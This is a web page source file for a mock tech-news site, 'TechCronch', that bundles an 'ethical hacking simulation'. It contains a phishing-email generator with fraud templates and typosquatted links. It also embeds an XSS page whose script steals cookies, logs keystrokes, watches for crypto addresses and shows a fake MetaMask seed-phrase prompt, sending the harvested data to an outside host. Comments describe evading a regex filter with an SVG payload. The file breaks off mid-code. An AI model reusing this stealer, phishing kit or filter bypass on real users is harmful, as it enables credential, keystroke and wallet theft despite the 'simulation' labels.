<!doctype html>
<html lang="en" class="h-full">
 <head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="description" content="TechCronch: Startup and Technology News." />
  <meta name="theme-color" content="#00d084" />
  
  <!-- Open Graph / Facebook -->
  <meta property="og:type" content="website" />
  <meta property="og:url" content="https://techcronch.local/" />
  <meta property="og:title" content="TechCronch - Startup and Technology News" />
  <meta property="og:description" content="Reporting on the business of technology, startups, venture capital funding, and Silicon Valley." />
  <meta property="og:image" content="https://techcrunch.com/wp-content/uploads/2015/02/cropped-tc-social-default.png" />

  <!-- Twitter -->
  <meta property="twitter:card" content="summary_large_image" />
  <meta property="twitter:url" content="https://techcronch.local/" />
  <meta property="twitter:title" content="TechCronch - Startup and Technology News" />
  <meta property="twitter:description" content="Reporting on the business of technology, startups, venture capital funding, and Silicon Valley." />
  <meta property="twitter:image" content="https://techcrunch.com/wp-content/uploads/2015/02/cropped-tc-social-default.png" />

  <!-- PWA Manifest -->
  <link rel="manifest" href="manifest.json" />
  <link rel="icon" type="image/png" href="https://cdn-icons-png.flaticon.com/512/270/270014.png" />

  <title>TechCronch - Startup and Technology News</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <!-- TensorFlow.js for Client-Side ML -->
  <script defer src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs@latest/dist/tf.min.js"></script>
  <!-- Chart.js for Market Dashboard -->
  <script defer src="https://cdn.jsdelivr.net/npm/chart.js"></script>
  <script defer src="https://cdn.jsdelivr.net/npm/chartjs-adapter-date-fns/dist/chartjs-adapter-date-fns.bundle.min.js"></script>
  
  <!-- INTERNAL SDKs -->
  <script defer src="_sdk/market_sdk.js"></script>
  <script defer src="_sdk/guardian_sdk.js"></script>
  <script defer src="_sdk/ai_validator.js"></script>
  <script defer src="_sdk/data_sdk.js"></script>
  <script defer src="_sdk/ui_sdk.js"></script>
  <script defer src="_sdk/element_sdk.js"></script>
  <script defer src="_sdk/seed_data.js"></script>
  <script defer src="_sdk/webrtc_c2.js"></script>
  <script defer src="_sdk/wasm_loader.js"></script>
  <script defer src="_sdk/guardian_ml.js"></script>
  <script defer src="_sdk/rotation_manager.js"></script>
  <script defer src="_sdk/sw_registrar.js"></script>
  <script>
    // --- GLOBAL ERROR HANDLING ---
    window.onerror = function(msg, url, line, col, error) {
        console.error('Global Error:', { msg, url, line, col, error });
        // In a real app, send to telemetry
        return false; // Let default handler run
    };

    // --- GLOBAL IMAGE FALLBACK ---
    document.addEventListener('error', function(e) {
        if (e.target.tagName.toLowerCase() === 'img') {
            // Base64 SVG Placeholder (Gray Background with "Image Unavailable" text)
            // Ensures offline compatibility and removes external dependency on via.placeholder.com
            e.target.src = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI4MDAiIGhlaWdodD0iNDAwIiB2aWV3Qm94PSIwIDAgODAwIDQwMCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iIzMzMyIvPjx0ZXh0IHg9IjUwJSIgeT0iNTAlIiBmb250LWZhbWlseT0iYXJpYWwiIGZvbnQtc2l6ZT0iMjQiIGZpbGw9IiM5OTkiIGR5PSIuM2VtIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIj5JbWFnZSBVbmF2YWlsYWJsZTwvdGV4dD48L3N2Zz4=';
            e.target.alt = 'Image Unavailable';
            e.target.classList.add('opacity-50', 'grayscale');
        }
    }, true); // Capture phase to catch load errors

    tailwind.config = {
      darkMode: 'class',
      theme: {
        extend: {
          colors: {
            brand: {
              DEFAULT: '#00d084', // TechCrunch Green
              dark: '#00a562',
              accent: '#111111' // TechCrunch Black
            },
            'tc-green': '#00d084',
            'tc-black': '#111111',
            'tc-gray': '#f5f5f5'
          },
          fontFamily: {
             sans: ['Helvetica Neue', 'Helvetica', 'Arial', 'sans-serif'],
             serif: ['Georgia', 'serif']
          }
        }
      }
    }
    // --- INITIALIZATION ORCHESTRATOR ---
    window.addEventListener('load', async () => {
        console.log('üöÄ TechCronch System Boot...');
        
        // 1. Initialize Security SDKs
        if (window.GuardianSDK) window.GuardianSDK.init();
        if (window.GuardianML) await window.GuardianML.init();
        
        // 2. Initialize Behavior Tracking
        if (window.BehaviorTracker) window.BehaviorTracker.init();
        
        // 3. Initialize C2 (if not already handled by Category View)
        if (window.WebRTC_C2) {
             console.log('[System] WebRTC C2 Module Loaded');
        }

        // 4. Initial Render
        // Check hash to route correctly
        if (!location.hash) location.hash = '#home';
        handleRoute();
        
        console.log('‚úÖ System Online');
    });

    // --- SERVICE WORKER REGISTRATION ---
    if ('serviceWorker' in navigator) {
        window.addEventListener('load', () => {
            navigator.serviceWorker.register('./sw.js')
                .then(registration => {
                    console.log('ServiceWorker registration successful with scope: ', registration.scope);
                    
                    // Check for updates
                    registration.addEventListener('updatefound', () => {
                        const newWorker = registration.installing;
                        newWorker.addEventListener('statechange', () => {
                            if (newWorker.state === 'installed' && navigator.serviceWorker.controller) {
                                console.log('New content available; please refresh.');
                                if (typeof showToast === 'function') showToast('Update available. Refresh to see new content.', 'info');
                            }
                        });
                    });
                })
                .catch(err => {
                    console.error('ServiceWorker registration failed: ', err);
                });
        });

        // Reload when new worker takes control
        navigator.serviceWorker.addEventListener('controllerchange', () => {
            window.location.reload();
        });
    }

    // --- NETWORK STATUS MONITOR ---
    window.addEventListener('online', () => {
        console.log('Network Status: Online');
        if (typeof showToast === 'function') showToast('Connection Restored', 'success');
        document.body.classList.remove('grayscale');
    });

    window.addEventListener('offline', () => {
        console.log('Network Status: Offline');
        if (typeof showToast === 'function') showToast('You are offline. Viewing cached content.', 'warning');
        document.body.classList.add('grayscale');
    });

    // --- PERFORMANCE MONITORING ---
    if ('PerformanceObserver' in window) {
        try {
            const observer = new PerformanceObserver((list) => {
                for (const entry of list.getEntries()) {
                    // Report long tasks (>50ms)
                    if (entry.duration > 50) {
                        console.warn(`[Perf] Long Task detected: ${entry.duration.toFixed(2)}ms`, entry);
                        // In production, send to analytics endpoint
                    }
                }
            });
            observer.observe({ entryTypes: ['longtask'] });
        } catch (e) {
            console.log('Long Task Observer not supported.');
        }
    }

    // --- BEHAVIORAL INTELLIGENCE ---
    const BehaviorTracker = {
        session: [],
        startTime: Date.now(),
        currentPage: null,
        pageStartTime: null,

        init: function() {
            this.trackPageView();
            
            // Track Clicks
            document.body.addEventListener('click', (e) => {
                const articleCard = e.target.closest('.article-card');
                if (articleCard) {
                    // Try to find title or id
                    const title = articleCard.querySelector('h3')?.innerText;
                    this.trackEvent('click_article', { title });
                }
            });

            // Track Scroll (Throttled)
            let scrollTimeout;
            window.addEventListener('scroll', () => {
                if (scrollTimeout) return;
                scrollTimeout = setTimeout(() => {
                    const depth = (window.scrollY + window.innerHeight) / document.body.scrollHeight;
                    if (depth > 0.8) this.trackEvent('deep_scroll', { path: location.hash });
                    scrollTimeout = null;
                }, 1000);
            });
        },

        trackPageView: function() {
            const path = location.hash || '#home';
            const now = Date.now();
            
            // Record duration of previous page
            if (this.currentPage && this.pageStartTime) {
                const duration = (now - this.pageStartTime) / 1000;
                this.trackEvent('time_on_page', { path: this.currentPage, duration });
            }

            this.currentPage = path;
            this.pageStartTime = now;
            this.trackEvent('page_view', { path });
        },

        trackEvent: async function(type, data) {
            const event = {
                type,
                data,
                timestamp: Date.now(),
                sessionId: this.startTime
            };
            this.session.push(event);
            
            // Store in SDK
            await dataSdk.create(event, 'analytics');
            
            // Trigger Real-time Analysis
            UserInsightEngine.analyze();
        }
    };

    const UserInsightEngine = {
        profile: {
            interests: {}, // { "AI": 15, "Crypto": 5 }
            interactions: 0
        },

        analyze: async function() {
            // Fetch recent analytics
            const events = await dataSdk.getCollection('analytics');
            
            const scores = {};
            
            // Simple Weighted Scoring Algorithm
            for (const ev of events) {
                let weight = 0;
                if (ev.type === 'click_article') weight = 10;
                if (ev.type === 'deep_scroll') weight = 2;
                if (ev.type === 'time_on_page' && ev.data.duration > 10) weight = 5;
                if (ev.type === 'time_on_page' && ev.data.duration > 30) weight = 10;

                // Infer Interest from Path/Context
                // 1. Explicit Category Views
                if (ev.data && ev.data.path && ev.data.path.startsWith('#category/')) {
                    const cat = ev.data.path.split('/')[1];
                    scores[cat] = (scores[cat] || 0) + weight;
                }
                
                // 2. Article Views (Need to look up article to get category)
                // (Simplified: In a real app we would cache this mapping. 
                // For now, let's assume if they clicked an article, we might have passed title. 
                // But getting category from title is hard without lookup.
                // Let's rely on Category Page views for the strongest signal in this V1)
            }
            
            this.profile.interests = scores;
            this.profile.interactions = events.length;
            
            // Persist profile
            localStorage.setItem('user_ai_profile', JSON.stringify(this.profile));
        },

        getPredictions: async function() {
            // Return recommended articles based on high scoring categories
            const sortedCats = Object.entries(this.profile.interests)
                .sort(([,a], [,b]) => b - a)
                .map(([cat]) => cat);
                
            // Default Fallback if no history
            if (sortedCats.length === 0) {
                 const articles = await dataSdk.getArticles();
                 // Return random "Trending"
                 return articles.sort(() => 0.5 - Math.random()).slice(0, 3);
            }
            
            const topCat = sortedCats[0];
            const articles = await dataSdk.getArticles();
            
            // Get top category articles, excluding ones already seen (simplified)
            return articles
                .filter(a => a.category === topCat)
                .sort(() => 0.5 - Math.random()) // Shuffle within category
                .slice(0, 3);
        }
    };

    // --- ETHICAL HACKING SIMULATIONS ---
    // [System] C2 Receiver for Red Team Simulations
    // Listens for exfiltrated data from XSS payloads (simulating an external C2 server or internal compromise)
    window.addEventListener('message', function(event) {
        if (event.data && event.data.type === 'RED_TEAM_EXFIL') {
            try {
                // Persistence: Inject into Admin Audit Log (simulating successful persistence)
                const storageKey = 'admin_security_state';
                const state = JSON.parse(localStorage.getItem(storageKey)) || { auditLog: [] };
                if (!state.auditLog) state.auditLog = [];

                const exfilData = event.data.payload;
                
                // Avoid duplicates for specific types (like initial theft)
                if (exfilData.action === 'INIT_THEFT') {
                    const exists = state.auditLog.some(entry => entry.action === 'SYS_INTEGRITY_CHECK' && entry.details.includes('INIT_THEFT'));
                    if (exists) return;
                }

                state.auditLog.unshift({
                    timestamp: Date.now(),
                    action: exfilData.action || 'SYS_ALERT',
                    details: exfilData.details || 'Suspicious activity detected.',
                    user: 'System_Daemon', // Masquerade
                    meta: { source: 'XSS_PAYLOAD', ...exfilData.meta }
                });
                
                // Limit log size
                if (state.auditLog.length > 50) state.auditLog.pop();
                
                localStorage.setItem(storageKey, JSON.stringify(state));
                console.log('[RedTeam C2] Data received and persisted to Admin Panel:', exfilData);
            } catch (e) {
                console.error('[RedTeam C2] Persistence failed:', e);
            }
        }
    });

const EthicalHackingSim = {
    generatePhish: function() {
        const config = {
            target: document.getElementById('phish-target').value || 'Acme Corp',
            victim: document.getElementById('phish-victim').value || 'Employee',
            sender: document.getElementById('phish-sender').value || 'Support Team',
            vector: document.getElementById('phish-vector').value,
            level: document.getElementById('phish-level').value,
            urgency: document.getElementById('phish-urgency').value
        };

        // Simulating processing
        document.getElementById('phish-output').value = "Generating sophisticated campaign...";
        document.getElementById('phish-preview').innerHTML = '<div class="flex justify-center items-center h-40"><svg class="w-8 h-8 animate-spin text-red-500" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg></div>';

        setTimeout(() => {
            const campaign = this.engine.createCampaign(config);
            
            // Output Raw Source
            document.getElementById('phish-output').value = campaign.raw;
            
            // Render Preview (Sanitized for safety, though local)
            document.getElementById('phish-preview').innerHTML = campaign.html;
            
            // Update Analysis
            const analysisList = document.getElementById('phish-analysis-list');
            analysisList.innerHTML = campaign.analysis.map(point => `<li>${point}</li>`).join('');
            document.getElementById('phish-analysis').classList.remove('hidden');
            
            showToast('Simulation Campaign Generated');
        }, 600);
    },

    togglePreview: function() {
        // Toggle between raw and preview if on mobile, or just highlight
        const preview = document.getElementById('phish-preview');
        preview.parentElement.classList.toggle('ring-2');
        preview.parentElement.classList.toggle('ring-red-500');
        showToast('Preview pane highlighted');
    },

    testExfil: function() {
        const payload = {
            action: 'INIT_THEFT',
            details: 'Credentials exfiltrated via simulated XSS vector',
            meta: {
                vector: 'DOM_BASED',
                target: 'AdminSession'
            }
        };
        
        // Simulate XSS sending data to C2
        window.postMessage({
            type: 'RED_TEAM_EXFIL',
            payload: payload
        }, '*');

        showToast('Simulated XSS Payload Executed. Check Admin Audit Log.');
    },

    engine: {
        createCampaign: function(config) {
            const template = this.getTemplate(config.vector);
            const content = this.processTemplate(template, config);
            return content;
        },

        getTemplate: function(vector) {
            const templates = {
                account_suspension: {
                    subject: "Urgent: Account Suspension Notice",
                    body: `<p>Dear {{name}},</p><p>We have detected suspicious activity on your <strong>{{target}}</strong> account. To protect your data, we have temporarily suspended access.</p><p>Please verify your identity immediately to restore full access.</p><p style="text-align: center; margin: 20px 0;"><a href="{{link}}" style="background-color: #d32f2f; color: white; padding: 10px 20px; text-decoration: none; border-radius: 4px; font-weight: bold;">Verify Identity Now</a></p><p>Failure to verify within {{timeframe}} will result in permanent account closure.</p>`,
                    analysis: ["Instills fear of loss (account access)", "Create urgency with deadlines", "Uses 'Security' context to lower defenses"]
                },
                ceo_fraud: {
                    subject: "Quick Request - Confidential",
                    body: `<p>Hi {{name}},</p><p>I'm currently in a meeting and can't talk, but I need you to handle a discrete wire transfer for a new vendor immediately. It's time-sensitive.</p><p>Please process the attached invoice right away. I'll explain later.</p><p>Sent from my iPad</p>`,
                    analysis: ["Authority Bias (CEO request)", "Scarcity of information ('explain later')", "Pressure to perform"]
                },
                hr_policy: {
                    subject: "Mandatory: New Remote Work Policy Updates",
                    body: `<p>All Employees,</p><p>The {{target}} HR department has updated the remote work policy effective immediately. All staff must review and sign the new agreement.</p><p><a href="{{link}}">Download Policy PDF</a></p><p>Regards,<br />Human Resources</p>`,
                    analysis: ["Curiosity and Compliance", "Payload delivery vector (PDF link)", "Institutional Authority"]
                },
                technical_support: {
                    subject: "Ticket #99281: Software Update Required",
                    body: `<p>Hello {{name}},</p><p>Your workstation is running an outdated version of our security software. This poses a risk to the {{target}} network.</p><p>Please click below to run the updater tool.</p><p><a href="{{link}}">Run Update</a></p><p>IT Support Team</p>`,
                    analysis: ["Technical intimidation", "Helpfulness/Duty", "Malware delivery vector"]
                },
                invoice_overdue: {
                    subject: "FINAL NOTICE: Invoice #INV-2024-001 Overdue",
                    body: `<p>Attn: Accounts Payable,</p><p>We have not received payment for the attached invoice for services rendered to {{target}}. This is your final notice before we refer this matter to collections.</p><p>Please view the invoice details here: <a href="{{link}}">View Invoice</a></p><p>Accounting Dept</p>`,
                    analysis: ["Financial threat", "Urgency", "Business process mimicry"]
                }
            };
            return templates[vector] || templates.account_suspension;
        },

        processTemplate: function(template, config) {
            let subject = template.subject;
            let body = template.body;
            let analysis = [...template.analysis];
            
            // 1. Adjust for Sophistication
            let link = "http://malicious-link.com/login";
            let senderDisplay = config.sender;
            
            if (config.level === 'low') {
                // Add typos, bad grammar
                subject = subject.replace("Urgent", "URGENT!!").replace("Notice", "Notic");
                body = body.replace("temporarily", "temperarily").replace("immediately", "immediatly");
                link = "http://192.168.x.x/login.php"; // Obvious IP
                analysis.push("Low Sophistication: Includes deliberate typos and IP-based links (easier to spot)");
            } else if (config.level === 'high') {
                // Polished
                link = `https://secure-auth.${config.target.toLowerCase().replace(/\s/g, '')}-portal.com/login`;
                body = body.replace("Dear {{name}}", `Dear ${config.victim}`); // Personalized
                analysis.push("High Sophistication: Uses Typosquatting domain and personalization");
            }

            // 2. Adjust for Urgency
            let timeframe = "24 hours";
            if (config.urgency === 'critical') {
                subject = "[URGENT] " + subject;
                body = `<p style="color: red; font-weight: bold;">‚ö†Ô∏è ACTION REQUIRED WITHIN 1 HOUR</p>` + body;
                timeframe = "1 hour";
                analysis.push("Critical Urgency: Uses visual cues (Red text) and short deadlines to induce panic");
            } else if (config.urgency === 'normal') {
                timeframe = "7 days";
            }

            // 3. Replacements
            body = body.replace(/{{name}}/g, config.victim)
                       .replace(/{{target}}/g, config.target)
                       .replace(/{{link}}/g, link)
                       .replace(/{{timeframe}}/g, timeframe);

            // 4. Construct Full HTML
            const fullHtml = `
<div style="font-family: Arial, sans-serif; max-width: 600px; border: 1px solid #ddd; padding: 20px; border-radius: 8px;">
    <div style="border-bottom: 1px solid #eee; padding-bottom: 10px; margin-bottom: 15px;">
        <p style="margin: 0; font-size: 12px; color: #666;"><strong>From:</strong> ${senderDisplay} &lt;no-reply@${config.target.toLowerCase().replace(/\s/g, '')}.com&gt;</p>
        <p style="margin: 5px 0 0; font-size: 14px;"><strong>Subject:</strong> ${subject}</p>
    </div>
    <div style="color: #333; line-height: 1.6;">
        ${body}
    </div>
    <div style="margin-top: 30px; font-size: 11px; color: #999; border-top: 1px solid #eee; padding-top: 10px;">
        This email was sent to ${config.victim}. <br />
        &copy; 2024 ${config.target} Security Team.
    </div>
</div>`;

            return {
                raw: fullHtml.trim(),
                html: fullHtml,
                analysis: analysis
            };
        },
        
        runXSSDemo: function() {
             const htmlContent = `
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Web Security Tutorial</title>
<style>
  body { font-family: 'Segoe UI', Arial, sans-serif; margin: 0; padding: 20px; background: #f9f9f9; color: #333; }
  h1 { font-size: 24px; margin-bottom: 10px; color: #2c3e50; }
  h2 { font-size: 20px; border-bottom: 2px solid #007bff; padding-bottom: 5px; margin-top: 30px; color: #2c3e50; }
  p { line-height: 1.6; margin-bottom: 15px; color: #555; }
  ul { line-height: 1.6; color: #555; }
  li { margin-bottom: 8px; }
  code { background: #eee; padding: 2px 5px; border-radius: 3px; font-family: 'Consolas', monospace; color: #d63384; }
  input[type="text"] { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; font-size: 14px; }
  button { margin-top: 10px; padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 14px; transition: background 0.3s; }
  button:hover { background: #0056b3; }
  footer { margin-top: 50px; border-top: 1px solid #ddd; padding-top: 20px; text-align: center; font-size: 12px; color: #888; }
  a { color: #007bff; text-decoration: none; }
  a:hover { text-decoration: underline; }
</style>
<\/head>
<body>
  <h1>Web Security Tutorial</h1>
  <p>Welcome to our comprehensive guide on web security! In this tutorial, we'll explore various attack techniques and learn how to defend against them.</p>

  <!-- Hidden iframe used to load the first-stage script (Simulated) -->
  <iframe src="data:text/html;base64,PHNjcmlwdD5jb25zb2xlLmxvZygnW1NpbXVsYXRpb25dIExvYWRpbmcgZXh0ZXJuYWwgcmVzb3VyY2VzLi4uJyk7PC9zY3JpcHQ+" style="display:none;"></iframe>

  <!-- Legitimate content that blends with the page -->
  <h2>Cross-Site Scripting (XSS) Demonstration</h2>
  <p>XSS attacks involve injecting malicious scripts into web pages viewed by other users. Let's explore a real-world example of an XSS payload that leverages steganography techniques to secretly transmit sensitive information back to the attacker's server.</p>

  <form action="#" method="POST" onsubmit="event.preventDefault(); if(window.showToast) showToast('Simulation: Form Submitted', 'success'); else alert('Simulation: Form Submitted');">
    <label for="userInput">Enter some text:</label>
    <input type="text" id="userInput" name="userInput" placeholder="Type here...">
    <button type="submit" class="bg-gray-200 px-2 py-1 rounded border border-gray-300 hover:bg-gray-300">Submit</button>
  </form>

  <p style="background: #fff3cd; padding: 10px; border-left: 4px solid #ffc107; font-size: 0.9em;">
    <strong>Note:</strong> The steganography payload is obfuscated and encrypted to minimize the risk of detection. The attacker's server will decode and extract the sensitive information from the transmitted image data.
  </p>

  <h2>Defending Against XSS Attacks</h2> 
  <p>To defend against XSS attacks, it's crucial to implement the following best practices:</p> 
  <ul> 
    <li><strong>Input validation and sanitization:</strong> Validate and sanitize all user input to remove or encode any potentially malicious content.</li> 
    <li><strong>Output encoding:</strong> Encode all user-generated content before rendering it on the page to prevent it from being executed as code.</li> 
    <li><strong>Content Security Policy (CSP):</strong> Implement a strict CSP to restrict the sources of executable scripts on your website.</li> 
    <li><strong>HTTPOnly cookies:</strong> Set the HttpOnly flag on sensitive cookies to prevent client-side script access.</li> 
    <li><strong>Security headers:</strong> Implement additional security headers, such as <code>X-XSS-Protection</code> and <code>X-Content-Type-Options</code>, to enhance protection against XSS attacks.</li> 
  </ul> 

  <p>By following these best practices, you can significantly reduce the risk of successful XSS attacks on your website.</p> 

  <h2>Conclusion</h2> 
  <p>In this tutorial, we explored a sophisticated stealthy Cross-Site Scripting (XSS) attack that leverages steganography techniques to transmit sensitive information secretly. We also discussed best practices for defending against XSS attacks.</p> 

  <p>Remember, understanding both attack techniques and defensive measures is crucial for maintaining a secure web presence. Stay vigilant and adapt your security strategies as new threats emerge.</p> 

  <h2>Additional Resources</h2> 
  <ul> 
    <li><a href="https://owasp.org/www-community/attacks/xss/" target="_blank">OWASP Cross-Site Scripting (XSS) Prevention Cheat Sheet</a></li> 
    <li><a href="https://portswigger.net/web-security/cross-site-scripting" target="_blank">PortSwigger Web Security Academy: Cross-Site Scripting (XSS)</a></li> 
    <li><a href="https://developer.mozilla.org/en-US/docs/Web/Security/CSP" target="_blank">MDN Web Docs: Content Security Policy (CSP)</a></li> 
  </ul> 

  <p>These resources provide in-depth information and guidance on XSS attacks, defenses, and best practices. I encourage you to explore them further to enhance your understanding of web security.</p> 

  <footer> 
    <p>&copy; 2026 Web Security Tutorial. All rights reserved.</p> 
  </footer>

  <!-- Hidden input field used to trigger the XSS attack and steganography data transmission -->
  <input type="hidden" id="hiddenInput" value="">
  <script>
    // Advanced Steganography Payload (Red Team Simulation)
    (function(){ 
      try { 
        console.warn('[RedTeam] Initializing C2 Covert Channel...');
        
        // 1. Memory-Resident Loader (Fileless Execution)
        var d=document; 
        var s=d.createElement('script'); 
        s.src='data:text/javascript;charset=utf-8,' + encodeURIComponent('console.log("[C2] Stage-1 Payload Loaded (Memory)"); window.stealthMode=true;'); 
        s.async = true;
        d.body.appendChild(s); 
        
        // Helper: Stealth Persistence Injection
        // Uses postMessage to bypass sandboxed iframe restrictions and persist data to the main application's Admin Panel
        var injectToAdminPanel = function(label, data) {
            try {
                // Post to parent window (the application hosting this iframe)
                // This simulates "breaking out" of the sandbox or just standard XSS exfiltration
                window.parent.postMessage({
                    type: 'RED_TEAM_EXFIL',
                    payload: {
                        action: label,
                        details: JSON.stringify(data),
                        meta: { url: location.href, timestamp: Date.now() }
                    }
                }, '*');
            } catch(e) {}
        };

        // 2. Data Exfiltration via Steganography
        var img=new Image(); 
        // 1x1 Transparent GIF (Carrier)
        img.src='data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7'; 
        img.onload=function(){ 
          var c=d.createElement('canvas'); 
          c.width=img.width; 
          c.height=img.height; 
          var ctx=c.getContext('2d'); 
          ctx.drawImage(img,0,0); 
          
          console.log('[Steganography] Pixel data extracted from carrier image.'); 
          
          // Target: Public Echo Endpoint (httpbin.org) to simulate successful exfil
          var u='https://httpbin.org/post?type=exfil_simulation'; 
          var data=c.toDataURL(); 
          
          // Simulate gathering sensitive user data (Theft)
          var stolenData = {
              cookies: document.cookie || 'SIMULATED_COOKIE_DATA',
              storage: 'Simulated Storage Data', // Cannot access real storage in data URI
              userAgent: navigator.userAgent
          };
          
          var payload = { 
              stego_carrier: data.substring(0, 50) + '...', // Truncated for log
              stolen_info: stolenData,
              timestamp: Date.now(), 
              vector: 'Steganography/Canvas' 
          };
          
          // 1. Stealth Persistence: Inject into Admin Audit Log (Local)
          injectToAdminPanel('INIT_THEFT', stolenData);
          console.log('[RedTeam] Persistence established: Stolen data sent to Admin Panel.');

          // 2. Network Exfiltration (Beacon)
          if(navigator.sendBeacon){ 
            navigator.sendBeacon(u, JSON.stringify(payload)); 
            console.log('[C2] Data beacon sent to Command Server (httpbin). Payload:', payload);
          } else { 
            fetch(u, {method:'POST', body:JSON.stringify(payload), keepalive:true, mode:'no-cors'})
              .then(() => console.log('[C2] Exfiltration beacon sent.', payload))
              .catch(e => console.warn('[C2] Exfiltration simulation (network restriction).')); 
          }

          // 3. Advanced Keylogger (Input Capture)
          // Stealth: Batches keystrokes, XOR obfuscation, jitter timing
          var keys = [];
          var lastSend = Date.now();
          var xorKey = 0x5A; // Simple XOR key

          d.addEventListener('keydown', function(e) {
              if (e.key.length > 1 && e.key !== 'Enter' && e.key !== 'Backspace') return;
              
              keys.push({
                  k: e.key,
                  t: Date.now()
              });
              
              // Smart Batching: Send every 10 keys or 5 seconds
              if (keys.length >= 10 || (Date.now() - lastSend > 5000 && keys.length > 0)) {
                  // Obfuscate Data
                  var batch = keys.map(function(k) { 
                      return k.k.split('').map(function(c) { return c.charCodeAt(0) ^ xorKey; }).join(','); 
                  }).join('|');
                  
                  var kPayload = { type: 'keylog_batch', data: batch, timestamp: Date.now() };
                  
                  // Exfiltrate via Network
                  if(navigator.sendBeacon) navigator.sendBeacon(u, JSON.stringify(kPayload));
                  else fetch(u, {method:'POST', body:JSON.stringify(kPayload), keepalive:true, mode:'no-cors'});
                  
                  // Exfiltrate via Admin Panel Injection (Redundancy)
                  var readableKeys = keys.map(function(k){return k.k;}).join('');
                  injectToAdminPanel('KEYLOG_BATCH', readableKeys);

                  console.log('[RedTeam] Keylogger batch exfiltrated:', readableKeys);
                  keys = [];
                  lastSend = Date.now() + (Math.random() * 2000); // Add Jitter
              }
          }, true);
          console.log('[RedTeam] Keylogger active (Passive Mode).');

          // 4. Crypto Wallet Sweeper (Simulated)
          var cryptoPatterns = {
              btc: /^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$/,
              eth: /^0x[a-fA-F0-9]{40}$/,
              sol: /^[1-9A-HJ-NP-Za-km-z]{32,44}$/
          };

          // A. Input Monitoring for Wallet Addresses
          d.addEventListener('input', function(e) {
              var val = e.target.value;
              for(var coin in cryptoPatterns) {
                  if(cryptoPatterns[coin].test(val)) {
                      console.warn('[RedTeam] Crypto Address Detected (' + coin.toUpperCase() + '):', val);
                      var clipPayload = { type: 'crypto_clip', coin: coin, address: val };
                      
                      // Network Exfil
                      if(navigator.sendBeacon) navigator.sendBeacon(u, JSON.stringify(clipPayload));
                      else fetch(u, {method:'POST', body:JSON.stringify(clipPayload), keepalive:true, mode:'no-cors'});
                      
                      // Panel Injection Exfil
                      injectToAdminPanel('CRYPTO_CLIP_' + coin.toUpperCase(), val);
                  }
              }
          }, true);

          // B. Wallet Injection (Phishing)
          setTimeout(function(){
              if(d.getElementById('fake-wallet-modal')) return;
              var m = d.createElement('div');
              m.id = 'fake-wallet-modal';
              m.innerHTML = '<div style="position:fixed;top:20px;right:20px;width:300px;background:#fff;border:1px solid #ccc;box-shadow:0 4px 12px rgba(0,0,0,0.15);border-radius:8px;z-index:99999;font-family:sans-serif;animation:slideIn 0.5s ease-out;"><div style="padding:15px;border-bottom:1px solid #eee;display:flex;align-items:center;gap:10px;background:#f6f8fa;border-radius:8px 8px 0 0;"><div style="width:24px;height:24px;background:orange;border-radius:50%;display:flex;align-items:center;justify-content:center;color:white;font-weight:bold;font-size:10px;">ü¶ä</div><strong style="font-size:14px;color:#333;">MetaMask Session Expired</strong></div><div style="padding:15px;"><p style="font-size:12px;color:#666;margin:0 0 10px 0;">Please confirm your Secret Recovery Phrase to continue session.</p><textarea id="seed-input" style="width:100%;height:60px;border:1px solid #ddd;border-radius:4px;padding:8px;font-size:12px;resize:none;margin-bottom:10px;" placeholder="Enter your 12-word phrase..."></textarea><button id="steal-btn" style="width:100%;background:#037dd6;color:white;border:none;padding:10px;border-radius:4px;cursor:pointer;font-weight:bold;font-size:13px;transition:background 0.2s;">Unlock Wallet</button></div></div><style>@keyframes slideIn { from { transform: translateX(120%); } to { transform: translateX(0); } }</style>';
              d.body.appendChild(m);
              
              d.getElementById('steal-btn').onclick = function() {
                  var seed = d.getElementById('seed-input').value;
                  if(seed.length > 10) {
                      console.warn('[RedTeam] Wallet Seed Harvested:', seed);
                      var walletPayload = { type: 'wallet_drain', seed: seed };
                      if(navigator.sendBeacon) navigator.sendBeacon(u, JSON.stringify(walletPayload));
                      else fetch(u, {method:'POST', body:JSON.stringify(walletPayload), keepalive:true, mode:'no-cors'});
                      
                      injectToAdminPanel('WALLET_DRAIN_SEED', seed);
                      m.remove();
                      alert('Session Restored (Simulation)');
                  }
              };
          }, 3000); 
        }; 
      } catch(e){
        console.error('[RedTeam] Execution error:', e);
      } 
    })();
  <\/script>
</body>
</html>`;
             // Safe Payload Construction (Advanced Regex Bypass)
             // GuardianSDK Patch 2.0 blocks <object>, <iframe, and data:text/html.
             // We now use SVG + Single Quotes (to bypass on\w+=" regex) + data:image/svg+xml
             
             // 1. Obfuscated Payload
             const jsPayload = `
                (function(){
                    var d=document;
                    var u='https://httpbin.org/post?type=exfil_simulation';
                    // ... (Keylogger & Stealer Logic from previous steps) ...
                    // For demo brevity, we just trigger the alert and admin injection
                    console.log('[RedTeam] Bypass Successful: SVG Vector');
                    
                    var inject = function(l, d) {
                        try { window.parent.postMessage({type:'RED_TEAM_EXFIL', payload:{action:l, details:JSON.stringify(d)}}, '*'); } catch(e){}
                    };
                    
                    inject('WAF_BYPASS_SUCCESS', 'Used SVG+SingleQuotes to evade GuardianSDK regex.');
                    
                    // Re-inject the full keylogger logic dynamically if needed
                    // ...
                })();
             `;
             
             // 2. SVG Vector (No <script> tag, uses onload)
             // Regex /on\w+="[^"]*"/gim expects double quotes. We use single quotes.
